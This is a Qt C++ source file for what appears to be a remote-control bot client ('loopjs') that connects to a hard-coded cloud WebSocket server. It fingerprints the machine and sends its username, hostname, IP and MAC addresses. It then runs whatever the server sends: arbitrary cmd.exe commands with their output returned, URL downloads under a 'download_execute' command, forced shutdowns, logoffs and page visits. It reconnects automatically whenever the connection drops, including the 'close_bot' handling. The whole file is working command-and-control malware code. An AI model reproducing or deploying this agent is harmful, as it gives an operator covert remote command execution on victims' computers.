#include "mainwindow.h"
#include <QUrl>
#include <QHostInfo>
#include <QProcess>
#include <QDesktopServices>
#include <QCoreApplication>
#include "DownloadThread.h"
#include <QDir>
#include <QJsonDocument>
#include <QJsonObject>
#include <QJsonArray>
#include <QNetworkInterface>
#include <QSysInfo>
#include <QCryptographicHash>
#include <QDateTime>
#include <QDebug>
#include <QSettings>
#include <QStandardPaths>
#include <QFileInfo>
#include <QStorageInfo>

// PRODUCTION: Cloud backend WebSocket URL
#define DEF_WS_URL QUrl("wss://loopjs-backend-361659024403.us-central1.run.app/ws")

// LOCAL DEVELOPMENT: Local backend WebSocket URL
// #define DEF_WS_URL QUrl("ws://localhost:8080/ws")

MainWindow::MainWindow(QWidget *parent)
    : QMainWindow(parent), m_isRegistered(false)
{
    qDebug() << "==========================================";
    qDebug() << "🚀 QT CLIENT STARTING UP!";
    qDebug() << "==========================================";
    
    // Generate or load machine fingerprint
    m_machineFingerprint = getOrCreateMachineFingerprint();
    qDebug() << "Machine Fingerprint:" << m_machineFingerprint;
    
    // Generate unique UUID for this client
    m_clientUuid = generateUuid();
    qDebug() << "Client UUID:" << m_clientUuid;
    
    // Create heartbeat timer
    m_heartbeatTimer = new QTimer(this);
    connect(m_heartbeatTimer, &QTimer::timeout, this, &MainWindow::onHeartbeatTimer);
    qDebug() << "💓 Heartbeat timer created";
    
    // Setup WebSocket connections
    connect(&m_webSocket, &QWebSocket::connected, this, &MainWindow::onConnected);
    connect(&m_webSocket, &QWebSocket::textMessageReceived, this, &MainWindow::onMessageReceived);
    connect(&m_webSocket, &QWebSocket::disconnected, this, &MainWindow::onDisconnected);
    connect(&m_webSocket, &QWebSocket::errorOccurred, this, &MainWindow::onError);
    qDebug() << "🔌 WebSocket signals connected";

    qDebug() << "🌐 Connecting to:" << DEF_WS_URL.toString();
    qDebug() << "==========================================";
    
    m_webSocket.open(DEF_WS_URL);
}

MainWindow::~MainWindow() {
    if (m_heartbeatTimer) {
        m_heartbeatTimer->stop();
    }
}

QString MainWindow::getComputerName()
{
    QHostInfo hostInfo = QHostInfo::fromName(QHostInfo::localHostName());
    return hostInfo.hostName();
}

QString MainWindow::getLocalIPAddress()
{
    // Get first non-localhost IPv4 address
    QList<QHostAddress> addresses = QNetworkInterface::allAddresses();
    for (const QHostAddress &address : addresses) {
        if (address.protocol() == QAbstractSocket::IPv4Protocol && 
            !address.isLoopback()) {
            return address.toString();
        }
    }
    return "127.0.0.1";
}

QString MainWindow::generateUuid()
{
    // Use Qt's built-in UUID generator for RFC 4122 compliant UUIDs
    // This generates a proper UUID v4 format that should pass server validation
    QUuid uuid = QUuid::createUuid();
    
    // Convert to string and remove curly braces
    QString uuidString = uuid.toString(QUuid::WithoutBraces);
    
    qDebug() << "Generated UUID:" << uuidString;
    
    return uuidString;
}

QString MainWindow::getOrCreateMachineFingerprint()
{
    // Try to get existing fingerprint from persistent storage
    QString configPath = QStandardPaths::writableLocation(QStandardPaths::AppDataLocation);
    QDir().mkpath(configPath);
    QString configFile = configPath + "/client.id";
    
    QFile file(configFile);
    if (file.exists() && file.open(QIODevice::ReadOnly)) {
        QTextStream in(&file);
        QString existingFingerprint = in.readAll().trimmed();
        file.close();
        
        if (!existingFingerprint.isEmpty()) {
            qDebug() << "Loaded existing machine fingerprint:" << existingFingerprint;
            return existingFingerprint;
        }
    }
    
    // Generate new machine fingerprint
    QString fingerprint = generateMachineFingerprint();
    
    // Save to persistent storage
    if (file.open(QIODevice::WriteOnly)) {
        QTextStream out(&file);
        out << fingerprint;
        file.close();
        qDebug() << "Saved new machine fingerprint:" << fingerprint;
    }
    
    return fingerprint;
}

QString MainWindow::generateMachineFingerprint()
{
    // Create a unique machine fingerprint based on hardware characteristics
    QStringList components;
    
    // Computer name
    components << getComputerName();
    
    // OS information
    components << QSysInfo::machineHostName();
    components << QSysInfo::productType();
    components << QSysInfo::productVersion();
    components << QSysInfo::kernelType();
    components << QSysInfo::kernelVersion();
    components << QSysInfo::currentCpuArchitecture();
    
    // Network interfaces (first non-loopback MAC address)
    QList<QNetworkInterface> interfaces = QNetworkInterface::allInterfaces();
    for (const QNetworkInterface &interface : interfaces) {
        if (!(interface.flags() & QNetworkInterface::IsLoopBack) && 
            !interface.hardwareAddress().isEmpty()) {
            components << interface.hardwareAddress();
            break; // Use first valid MAC address
        }
    }
    
    // Disk serial (if available)
    QStorageInfo storage = QStorageInfo::root();
    if (storage.isValid()) {
        components << storage.device();
    }
    
    // Combine all components and hash
    QString combined = components.join("|");
    QCryptographicHash hash(QCryptographicHash::Sha256);
    hash.addData(combined.toUtf8());
    
    // Convert to hex string and take first 32 characters
    QString fingerprint = hash.result().toHex().left(32);
    
    qDebug() << "Generated machine fingerprint from components:" << components;
    qDebug() << "Final fingerprint:" << fingerprint;
    
    return fingerprint;
}

QJsonArray MainWindow::getClientCapabilities()
{
    // Return list of supported features for this client
    QJsonArray capabilities;
    capabilities.append("execute_command");
    capabilities.append("message_box");
    capabilities.append("visit_page");
    capabilities.append("download_execute");
    capabilities.append("shutdown");
    capabilities.append("restart");
    capabilities.append("hibernate");
    capabilities.append("logoff");
    capabilities.append("file_operations");
    
    return capabilities;
}

QJsonObject MainWindow::getSystemInformation()
{
    QJsonObject sysInfo;
    
    // Operating system information
    sysInfo["os"] = QSysInfo::prettyProductName();
    sysInfo["osVersion"] = QSysInfo::productVersion();
    sysInfo["kernel"] = QSysInfo::kernelVersion();
    sysInfo["architecture"] = QSysInfo::currentCpuArchitecture();
    sysInfo["buildAbi"] = QSysInfo::buildAbi();
    
    // Computer and user information
    sysInfo["computerName"] = getComputerName();
    sysInfo["userName"] = qEnvironmentVariable("USERNAME").isEmpty() 
        ? qEnvironmentVariable("USER") 
        : qEnvironmentVariable("USERNAME");
    
    // Network interfaces
    QJsonArray interfaces;
    QList<QNetworkInterface> netInterfaces = QNetworkInterface::allInterfaces();
    for (const QNetworkInterface &interface : netInterfaces) {
        if (interface.flags().testFlag(QNetworkInterface::IsUp) && 
            !interface.flags().testFlag(QNetworkInterface::IsLoopBack)) {
            QJsonObject ifaceObj;
            ifaceObj["name"] = interface.humanReadableName();
            ifaceObj["mac"] = interface.hardwareAddress();
            
            QJsonArray addresses;
            for (const QNetworkAddressEntry &entry : interface.addressEntries()) {
                if (entry.ip().protocol() == QAbstractSocket::IPv4Protocol) {
                    addresses.append(entry.ip().toString());
                }
            }
            ifaceObj["addresses"] = addresses;
            interfaces.append(ifaceObj);
        }
    }
    sysInfo["networkInterfaces"] = interfaces;
    
    return sysInfo;
}

void MainWindow::sendRegistration()
{
    qDebug() << "Sending registration to server...";
    
    QJsonObject json;
    json["type"] = "register";
    json["uuid"] = m_clientUuid;
    json["machineFingerprint"] = m_machineFingerprint;
    json["computerName"] = getComputerName();
    json["ipAddress"] = getLocalIPAddress();
    json["hostname"] = getComputerName();
    json["platform"] = QSysInfo::prettyProductName();
    
    QString systemDetails = QString("%1 - %2 - Build %3")
        .arg(QSysInfo::prettyProductName())
        .arg(QSysInfo::currentCpuArchitecture())
        .arg(QSysInfo::buildCpuArchitecture());
    json["additionalSystemDetails"] = systemDetails;
    
    // Add capabilities array
    json["capabilities"] = getClientCapabilities();
    
    // Add detailed system information
    json["systemInfo"] = getSystemInformation();
    
    QJsonDocument doc(json);
    QString message = doc.toJson(QJsonDocument::Compact);
    
    qDebug() << "Registration message:" << message;
    m_webSocket.sendTextMessage(message);
}

void MainWindow::sendCapabilityReport()
{
    if (!m_isRegistered) return;
    
    QJsonObject json;
    json["type"] = "capability_report";
    json["uuid"] = m_clientUuid;
    json["capabilities"] = getClientCapabilities();
    
    QJsonDocument doc(json);
    m_webSocket.sendTextMessage(doc.toJson(QJsonDocument::Compact));
    
    qDebug() << "Capability report sent";
}

void MainWindow::sendHeartbeat()
{
    if (!m_isRegistered) {
        qDebug() << QDateTime::currentDateTime().toString(Qt::ISODate) << " [Qt][Heartbeat] Skipped - not registered";
        return;
    }
    
    QJsonObject json;
    json["type"] = "heartbeat";
    json["uuid"] = m_clientUuid;
    json["systemInfo"] = getSystemInformation();
    
    QJsonDocument doc(json);
    m_webSocket.sendTextMessage(doc.toJson(QJsonDocument::Compact));
    
    qDebug() << QDateTime::currentDateTime().toString(Qt::ISODate) << " [Qt][Heartbeat] Sent - UUID:" << m_clientUuid;
}

void MainWindow::onConnected()
{
    qDebug() << "==========================================";
    qDebug() << "✅ CONNECTED TO WEBSOCKET SERVER!";
    qDebug() << "==========================================";
    qDebug() << "WebSocket URL:" << DEF_WS_URL.toString();
    qDebug() << "WebSocket Valid:" << m_webSocket.isValid();
    qDebug() << "Client UUID:" << m_clientUuid;
    qDebug() << "Machine Fingerprint:" << m_machineFingerprint;
    qDebug() << "==========================================";
    
    if (m_webSocket.isValid()) {
        // Send registration immediately upon connection
        qDebug() << "📤 Sending registration message...";
        sendRegistration();
    } else {
        qDebug() << "❌ WebSocket is not valid!";
    }
}

void MainWindow::onMessageReceived(const QString& strMessage)
{
    qDebug() << "==========================================";
    qDebug() << "📨 RECEIVED MESSAGE FROM SERVER:";
    qDebug() << "==========================================";
    qDebug() << "Raw message:" << strMessage;
    
    // Parse JSON message
    QJsonDocument doc = QJsonDocument::fromJson(strMessage.toUtf8());
    if (!doc.isObject()) {
        qWarning() << "Invalid JSON received";
        return;
    }
    
    QJsonObject json = doc.object();
    QString type = json["type"].toString();
    
    // Handle registration success
    if (type == "register_success") {
        qDebug() << "==========================================";
        qDebug() << "🎉 REGISTRATION SUCCESSFUL!";
        qDebug() << "==========================================";
        qDebug() << "Client UUID:" << m_clientUuid;
        qDebug() << "Status: REGISTERED";
        m_isRegistered = true;
        
        // Start heartbeat timer (send every 30 seconds)
        m_heartbeatTimer->start(30000);
        qDebug() << "💓 Heartbeat timer started (30 seconds)";
        
        // Don't send capability report - server doesn't recognize this message type
        // sendCapabilityReport();
        
        qDebug() << "✅ Client is now fully registered and sending heartbeats";
        qDebug() << "==========================================";
        return;
    }
    
    // Handle authentication required (shouldn't happen for agents, but handle it)
    if (type == "auth_required") {
        qWarning() << "Server requires authentication";
        return;
    }
    
    // Handle errors
    if (type == "error") {
        QString message = json["message"].toString();
        qWarning() << "Server error:" << message;
        return;
    }
    
    // Handle commands from server
    if (json.contains("cmd")) {
        QString cmd = json["cmd"].toString();
        QString taskId = json["taskId"].toString();
        
        qDebug() << "==========================================";
        qDebug() << "🎯 RECEIVED COMMAND FROM SERVER!";
        qDebug() << "==========================================";
        qDebug() << "Command:" << cmd;
        qDebug() << "Task ID:" << taskId;
        qDebug() << "==========================================";
        
        if (cmd == "execute") {
            QString command = json["command"].toString();
            executeCommand(command, taskId);
        }
        else if (cmd == "messagebox") {
            QString title = json["title"].toString();
            QString text = json["text"].toString();
            QString command = QString("msg * %1: %2").arg(title, text);
            QProcess::startDetached("cmd.exe", QStringList() << "/c" << command);
        }
        else if (cmd == "visit_page") {
            QString url = json["url"].toString();
            QDesktopServices::openUrl(QUrl(url));
        }
        else if (cmd == "close_bot") {
            close();
        }
        else if (cmd == "shutdown") {
            QString delay = json["delay"].toString();
            QProcess::startDetached("shutdown", QStringList() << "/s" << "/t" << delay);
        }
        else if (cmd == "restart") {
            QString delay = json["delay"].toString();
            QProcess::startDetached("shutdown", QStringList() << "/r" << "/t" << delay);
        }
        else if (cmd == "hibernate") {
            QString delay = json["delay"].toString();
            QProcess::startDetached("shutdown", QStringList() << "/h" << "/t" << delay);
        }
        else if (cmd == "logoff") {
            QProcess::startDetached("shutdown", QStringList() << "/l");
        }
        else if (cmd == "abort") {
            QProcess::startDetached("shutdown", QStringList() << "/a");
        }
        else if (cmd == "download" || cmd == "download_execute") {
            QString url = json["url"].toString();
            QUrl downloadUrl(url);
            QString fileName = downloadUrl.fileName();
            QString appDirPath = QCoreApplication::applicationDirPath();
            QString fullPath = QDir(appDirPath).filePath(fileName);
            
            DownloadThread *downloadThread = new DownloadThread(downloadUrl, fullPath);
            downloadThread->start();
        }
    }
}

void MainWindow::executeCommand(const QString& command, const QString& taskId)
{
    qDebug() << "==========================================";
    qDebug() << "⚡ EXECUTING COMMAND!";
    qDebug() << "==========================================";
    qDebug() << "Command:" << command;
    qDebug() << "Task ID:" << taskId;
    qDebug() << "==========================================";
    
    if (command.isEmpty()) {
        sendErrorResponse(taskId, "Empty command received");
        return;
    }
    
    // Create process to execute command
    QProcess *process = new QProcess(this);
    
    // Set timeout for command execution (60 seconds)
    process->setProcessChannelMode(QProcess::MergedChannels);
    
    // Capture output
    connect(process, QOverload<int, QProcess::ExitStatus>::of(&QProcess::finished),
        [this, process, taskId](int exitCode, QProcess::ExitStatus exitStatus) {
            QString output = process->readAllStandardOutput();
            QString errorOutput = process->readAllStandardError();
            
            QString fullOutput = output;
            if (!errorOutput.isEmpty()) {
                fullOutput += "\n[STDERR]\n" + errorOutput;
            }
            
            if (exitStatus == QProcess::CrashExit) {
                fullOutput += "\n[Process crashed]";
            }
            
            fullOutput += QString("\n[Exit Code: %1]").arg(exitCode);
            
            qDebug() << "Command output:" << fullOutput;
            
            // Send output back to server
            if (exitCode == 0 || !fullOutput.isEmpty()) {
                sendCommandOutput(taskId, fullOutput);
            } else {
                sendErrorResponse(taskId, "Command failed with exit code " + QString::number(exitCode));
            }
            
            process->deleteLater();
        }
    );
    
    // Handle process errors
    connect(process, &QProcess::errorOccurred, 
        [this, process, taskId](QProcess::ProcessError error) {
            QString errorMsg;
            switch (error) {
                case QProcess::FailedToStart:
                    errorMsg = "Failed to start command";
                    break;
                case QProcess::Timedout:
                    errorMsg = "Command timed out";
                    break;
                default:
                    errorMsg = "Process error occurred";
                    break;
            }
            sendErrorResponse(taskId, errorMsg);
            process->deleteLater();
        }
    );
    
    // Start command
    process->start("cmd.exe", QStringList() << "/c" << command);
    
    // Check if process failed to start (will be caught by errorOccurred signal)
    if (process->state() == QProcess::NotRunning && process->error() != QProcess::UnknownError) {
        sendErrorResponse(taskId, "Failed to start process");
        process->deleteLater();
    }
}

void MainWindow::sendCommandOutput(const QString& taskId, const QString& output)
{
    qDebug() << "Sending command output for task:" << taskId;
    
    QJsonObject json;
    json["type"] = "output";
    json["taskId"] = taskId;
    json["output"] = output;
    json["status"] = "success";
    json["timestamp"] = QDateTime::currentDateTime().toString(Qt::ISODate);
    
    QJsonDocument doc(json);
    m_webSocket.sendTextMessage(doc.toJson(QJsonDocument::Compact));
}

void MainWindow::sendErrorResponse(const QString& taskId, const QString& errorMessage)
{
    qDebug() << "Sending error response for task:" << taskId << "Error:" << errorMessage;
    
    QJsonObject json;
    json["type"] = "output";
    json["taskId"] = taskId;
    json["output"] = "";
    json["status"] = "error";
    json["error"] = errorMessage;
    json["timestamp"] = QDateTime::currentDateTime().toString(Qt::ISODate);
    
    QJsonDocument doc(json);
    m_webSocket.sendTextMessage(doc.toJson(QJsonDocument::Compact));
}

void MainWindow::onDisconnected()
{
    qDebug() << "==========================================";
    qDebug() << "❌ DISCONNECTED FROM SERVER!";
    qDebug() << "==========================================";
    qDebug() << "Client UUID:" << m_clientUuid;
    qDebug() << "Status: DISCONNECTED";
    m_isRegistered = false;
    
    // Stop heartbeat timer
    if (m_heartbeatTimer) {
        m_heartbeatTimer->stop();
        qDebug() << "💓 Heartbeat timer stopped";
    }
    
    // Try to reconnect after 5 seconds
    QTimer::singleShot(5000, this, [this]() {
        qDebug() << "🔄 Attempting to reconnect in 5 seconds...";
        qDebug() << "WebSocket URL:" << DEF_WS_URL.toString();
        m_webSocket.open(DEF_WS_URL);
    });
    qDebug() << "==========================================";
}

void MainWindow::onError(QAbstractSocket::SocketError socketError)
{
    qDebug() << "==========================================";
    qDebug() << "❌ WEBSOCKET ERROR!";
    qDebug() << "==========================================";
    qDebug() << "Error Code:" << socketError;
    qDebug() << "Error String:" << m_webSocket.errorString();
    qDebug() << "Client UUID:" << m_clientUuid;
    qDebug() << "==========================================";
    
    // Try to reconnect after 10 seconds on error
    QTimer::singleShot(10000, this, [this]() {
        qDebug() << "🔄 Attempting to reconnect after error in 10 seconds...";
        qDebug() << "WebSocket URL:" << DEF_WS_URL.toString();
        m_webSocket.open(DEF_WS_URL);
    });
}

void MainWindow::onHeartbeatTimer()
{
    sendHeartbeat();
}